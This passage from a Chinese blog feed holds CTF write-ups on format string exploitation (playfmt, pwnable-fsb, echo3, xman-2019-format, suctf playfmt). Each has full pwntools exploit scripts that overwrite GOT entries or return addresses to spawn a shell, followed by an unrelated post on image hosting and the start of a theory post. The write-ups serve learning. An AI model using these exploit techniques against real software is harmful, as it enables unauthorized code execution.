href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./playfmt&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,26382)buf = 0x0804A060 + 0x40 #0x804a0a0offset1 = 6offset2 = 10info(&#39;---leak stack address---&#39;)io.recvuntil(&#39;\n=====================\n&#39;)io.sendline(&#39;%10$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))info(&#39;---change the retaddr---&#39;)key = int(str(hex(ret_stack_addr))[-2:],16)payload = &quot;%{}c%6$hhn&quot;.format(key)raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.recv()key2 = 0xa0a0payload = &quot;%{}c%10$hn&quot;.format(key2)payload = payload.ljust(0x40)payload += asm(shellcraft.sh())raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()sleep(0.1)io.sendline(&#39;quit&#39;)io.interactive()</code></pre><p>记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="arch和保护"><a href="#arch和保护" class="headerlink" title="arch和保护"></a>arch和保护</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开了nx了。</p><h3 id="ida分析-7"><a href="#ida分析-7" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c"> for ( k = 0; k &lt;= 3; ++k )  {    printf(&quot;Give me some format strings(%d)\n&quot;, k + 1);    read(0, buf, 0x64u);    printf(buf);  }  puts(&quot;Wait a sec...&quot;);  sleep(3u);</code></pre><p>可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。</p><pre><code class="c">  execve(path, &amp;path, 0);</code></pre><p>且这一条可以给你拿到shell。</p><p>那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。<br>因为这里下面就调用一次sleep，就改它好了，基本不会出问题。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。</p><h3 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>此时的EBP = 0xffffd228 </p><pre><code>0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;)0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;)0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;:    add    ebx,0x1b037)0020| 0xffffd1f4 --&gt; 0x00024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x00028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;:    cmp    DWORD PTR gs:0xc,0x0)0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;)0040| 0xffffd208 --&gt; 0x00044| 0xffffd20c --&gt; 0x00048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x00052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;)0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x00060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x00064| 0xffffd220 --&gt; 0x00068| 0xffffd224 --&gt; 0x10072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p>可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。</strong>然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./fsb&#39;)# s = ssh(#     host=&quot;pwnable.kr&quot;,#     port=2222,#     user=&quot;fsb&quot;,#     password=&quot;guest&quot;# )# io = s.run(&quot;/home/fsb/fsb&quot;)# io = shell.run(&quot;/home/fsb/fsb&quot;)sleep_got = 0x0804a008info(&#39;--------leak stack base:-------&#39;)io.recvuntil(&#39;strings(1)\n&#39;)io.sendline(&#39;%14$p&#39;)io.recvuntil(&#39;0x&#39;)stack_base = int(io.recv(8),16) - 80print(hex(stack_base))info(&#39;--------leak the point to main ebp:-------&#39;)io.recvuntil(&#39;strings(2)\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)point = int(io.recv(8),16)print(hex(point))info(&#39;--------write sleep_got to main_ebp :-------&#39;)io.recvuntil(&#39;strings(3)\n&#39;)key1 = 0x0804A008payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39;io.sendline(payload)info(&#39;--------write tag to sleep_got :-------&#39;)tag = 0x869Foffset = (point - stack_base) / 4payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag)io.recvuntil(&#39;strings(4)\n&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="保护和arch-6"><a href="#保护和arch-6" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-8"><a href="#ida分析-8" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>这一处会让栈的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。<br>（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。）</p><h3 id="gdb分析-2"><a href="#gdb分析-2" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p><p>仔细看下此时的栈情况 ，然后再次分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址</li></ul><p>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。<br>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以写system的内存地址上got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>这样再传过去一下<code>/bin/sh</code>即可。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continue# io = def fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。<h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3></li></ul><p>这个题教会我一定要<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="保护和arch-7"><a href="#保护和arch-7" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>CANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partial</code></pre><h3 id="ida分析-9"><a href="#ida分析-9" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">char *__cdecl sub_80485C4(char *s){  char *v1; // eax  char *result; // eax  puts(&quot;...&quot;);  v1 = strtok(s, &quot;|&quot;);  printf(v1);  while ( 1 )  {    result = strtok(0, &quot;|&quot;);    if ( !result )      break;    printf(result);  }  return result;}</code></pre><p>这里因为用strtok做处理，只有一次的传送机会，payload需要用<code>|</code>    分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。<br>并且存在后门函数：</p><pre><code>.text:080485AB                 push    ebp.text:080485AC                 mov     ebp, esp.text:080485AE                 sub     esp, 8.text:080485B1 ; 3:   return system(&quot;/bin/sh&quot;);.text:080485B1                 sub     esp, 0Ch.text:080485B4                 push    offset command  ; &quot;/bin/sh&quot;.text:080485B9                 call    _system.text:080485BE                 add     esp, 10h.text:080485C1                 nop.text:080485C2                 leave.text:080485C3                 retn</code></pre><p>这下可以直接改ret address即可。</p><h3 id="gdb分析-3"><a href="#gdb分析-3" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>先观察一下ebp链是否存在 ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>是存在的，然后直接利用就好了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>然后接着利用漏洞，改一下返回地址到后门函数即可。</p><p>（这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。）</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;system_addr = 0x080485B4tag1 = 0x4ctag2 = 0x85abio = process(&#39;./xman_2019_format&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27012)payload = &#39;%{}c%10$hhn|&#39;.format(0x4c)payload += &#39;%{}c%18$hn~&#39;.format(0x85ab)while True:    try:        io.recvuntil(&#39;...\n...\n&#39;)        io.sendline(payload)        sleep(0.1)        io.recvuntil(&#39;~&#39;)        io.sendline(&#39;ls&#39;)        io.recvline()        io.recvline()        io.interactive()        break    except EOFError :        io.close()        io = process(&#39;./xman_2019_format&#39;)        # io = remote(&#39;node3.buuoj.cn&#39;,27012)</code></pre><p>需要爆破栈。</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="保护和arch-8"><a href="#保护和arch-8" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开启了RELRO，这样就无法got hijack了</p><h3 id="ida分析-10"><a href="#ida分析-10" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdb分析-4"><a href="#gdb分析-4" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>其会被读到堆上。紧接着跟到格式化字符串漏洞处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>看一下这个堆地址是否被程序操作修改了：</p><pre><code>gdb-peda$ x/s 0x8050b700x8050b70:    &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;</code></pre><p>发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。<br>第一步：<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理：</p><pre><code>0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0</code></pre><p>此时再修改ebp1上的值，改成刚刚的堆地址 ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>这样exp写的时候，找好偏移%s一下就出来了。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = remote(&#39;node3.buuoj.cn&#39;,27816)io = process(&#39;./1&#39;)io.recvuntil(&#39;Magic echo Server&#39;)io.recvuntil(&#39;=====================\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)flag = int(io.recv(8),16)print(hex(flag))key = int((hex(flag))[-4:],16) - 32 -12 -4print(&#39;key&#39;+ hex(key))# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%6$p&#39;)io.recvuntil(&#39;0x&#39;)stack_point = int(io.recv(8),16) + 16tag1 = int((hex(stack_point))[-2:],16)print(hex(tag1))payload  = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1&#39;)payload = &#39;%&#39; +  str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;2&#39;)io.sendline(&#39;%18$s&#39;)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修复七千云外链失效</title>
    <link href="/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <url>/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/</url>
    
    <content type="html"><![CDATA[<h1 id="修复七千云外链失效"><a href="#修复七千云外链失效" class="headerlink" title="修复七千云外链失效"></a>修复七千云外链失效</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己的以前申请过一个七千云做自己的图床，今晚写博客发现，自己上传不上图片，并且用upic导出来的链接无法显示图片了。查了很久的原因，发现是七千牛原来给我分配的免费外链域名给我断用了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>就是这个没了，自己排错，排了半天才发现。是在这里找到的，好隐蔽。。。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>然后就在文件管理那里发现，网站提示说如果无法显示图片，加载慢，可以加一个域名。然后我就尝试加了一个，然后就修复好了。</p><h2 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h2><h3 id="绑定创建域名"><a href="#绑定创建域名" class="headerlink" title="绑定创建域名"></a>绑定创建域名</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxx也就是填你的域名，前面的可以自定义。点击添加后下面总是会自动又弹出一个空白的框，点击后面的删除，否则，往下滑你会发现就是创建不了这个记录。<br>创建成功后，会提示你复制<strong>CNAME</strong>，复制一下，去往你自己的域名网站，我用的是阿里云。</p><h3 id="去自己的dns解析平台"><a href="#去自己的dns解析平台" class="headerlink" title="去自己的dns解析平台"></a>去自己的dns解析平台</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>这里的主机记录填入刚刚你自定义的主机开头，记录值填入刚刚复制的CNAME，就可以了。</p><h3 id="修改upic设置"><a href="#修改upic设置" class="headerlink" title="修改upic设置"></a>修改upic设置</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>填入即可，以前写的博客，图片的链接也要改一下，就恢复原来的样子了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞小总结（上）</title>
    <link href="/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（上）"><a href="#格式化字符串漏洞小总结（上）" class="headerlink" title="格式化字符串漏洞小总结（上）"></a>格式化字符串漏洞小总结（上）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本格式：</p><pre><code class="c">%[parameter][flags][field width][.precision][length]type</code></pre><p>需要重点关注的pattern：</p><ol><li>parameter ：n$，获取格式化字符串中的指定参数</li><li>field width ：输出的最小宽度</li><li>precision ：输出的最大长度</li><li>length，输出的长度 : <code>hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ；</code></li><li>type :<pre><code class="c"> d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母. s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。 c，把 int 参数转为 unsigned char 型输出 p， void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值，printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个printf的函数） %， &#39;%&#39;字面值，不接受任何 flags, width。</code></pre></li></ol><p>参数：就是是要对应输出的变量。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制。<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>根据 <strong>cdecl 的调用约定</strong>,在进入 printf()  函数之前,将参数从右到左依次压栈。进入printf()  之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是    % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。<br>如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？<strong>此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露内存数据"><a href="#泄露内存数据" class="headerlink" title="泄露内存数据"></a>泄露内存数据</h3><h4 id="栈上的数据"><a href="#栈上的数据" class="headerlink" title="栈上的数据"></a>栈上的数据</h4><ol><li>利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p)</li><li>利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)<h4 id="任意地址内存"><a href="#任意地址内存" class="headerlink" title="任意地址内存"></a>任意地址内存</h4>当想泄露任意地址内存的时候，就需要<strong>想办法把地址写入栈中</strong>。<br>在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中<strong>对应的栈偏移</strong>，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是<strong>找对应的栈偏移</strong>。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。<h5 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h5><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。</p><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。</p><h6 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h6><p>可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下：</p><pre><code class="c">#include &lt;stdio.h&gt;int main(){        setvbuf(stdout,0,2,0);        char buf[100];        read(0,buf,99);        printf(buf);}</code></pre><p>gdb调试，找图中框框的栈地址，对应的偏移：<br>32位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。</p><h5 id="写地址进栈"><a href="#写地址进栈" class="headerlink" title="写地址进栈"></a>写地址进栈</h5><p>学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，<strong>把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）</strong>。</p><h6 id="32位："><a href="#32位：" class="headerlink" 